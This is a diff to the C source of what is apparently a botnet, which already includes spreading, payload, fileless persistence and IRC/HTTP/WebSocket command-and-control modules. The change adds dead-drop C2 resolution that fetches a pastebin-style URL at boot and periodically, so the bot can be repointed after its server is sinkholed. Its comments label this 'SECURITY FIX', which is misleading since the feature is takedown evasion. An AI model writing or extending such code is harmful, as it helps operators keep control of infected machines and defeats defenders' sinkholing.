@@ -9,6 +9,7 @@
 #include "spread.h"
 #include "payload.h"
 #include "persist.h"
+#include "deaddrop.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -86,6 +87,12 @@ static int init_bot(void) {
      * hostnames every flux_ttl seconds. */
     g_bot.flux_enabled = 0;
     g_bot.flux_ttl = FLUX_DEFAULT_TTL;
+    
+    /* SECURITY FIX (#86): Dead-drop C2 off by default. Set dead_drop_url=
+     * to a pastebin-style HTTP URL hosting the verified endpoint blob; the
+     * blob must echo c2_secret or it is ignored (static config falls back). */
+    g_bot.dead_drop_url[0] = '\0';
+    g_bot.dead_drop_interval = DEAD_DROP_DEFAULT_INTERVAL;
     
     /* Set default C2 config */
     strncpy(g_bot.c2_irc.server, IRC_DEFAULT_SERVER, sizeof(g_bot.c2_irc.server) - 1);
@@ -239,6 +246,11 @@ int main(void) {
     persist_become_fileless(&g_bot);
     persist_install(&g_bot);
     
+    /* SECURITY FIX (#86): Dead-drop C2 resolution runs at boot before any
+     * channel connects. A verified blob overrides the static endpoints; a
+     * failed, malformed, or unverified fetch leaves them as the fallback. */
+    deaddrop_resolve(&g_bot);
+    
     log_info("C2 protocols: IRC=%d HTTP=%d WS=%d",
              g_bot.c2_enabled & C2_IRC,
              g_bot.c2_enabled & C2_HTTP,
@@ -246,6 +258,8 @@ int main(void) {
     
     /* Heartbeat timer */
     time_t last_heartbeat = time(NULL);
+    /* Dead-drop re-resolution timer (#86) */
+    time_t last_dead_drop = time(NULL);
     
     while (g_running) {
         /* Try to connect to C2 */
@@ -265,6 +279,19 @@ int main(void) {
         if (time(NULL) - last_heartbeat >= hb_interval) {
             protocol_send_heartbeat(&g_bot);
             last_heartbeat = time(NULL);
+        }
+
+        /* SECURITY FIX (#86): Periodic dead-drop re-resolution. A repointed
+         * drop (e.g. the old C2 was sinkholed) takes effect on the next
+         * connect attempt. Disabled when no dead_drop_url is configured. */
+        if (g_bot.dead_drop_url[0] != '\0') {
+            uint32_t dd_interval = (g_bot.dead_drop_interval > 0)
+                                   ? g_bot.dead_drop_interval
+                                   : DEAD_DROP_DEFAULT_INTERVAL;
+            if (time(NULL) - last_dead_drop >= (time_t)dd_interval) {
+                deaddrop_resolve(&g_bot);
+                last_dead_drop = time(NULL);
+            }
         }
 
         /* SECURITY FIX (#65): Periodic update check (every 6h by its own
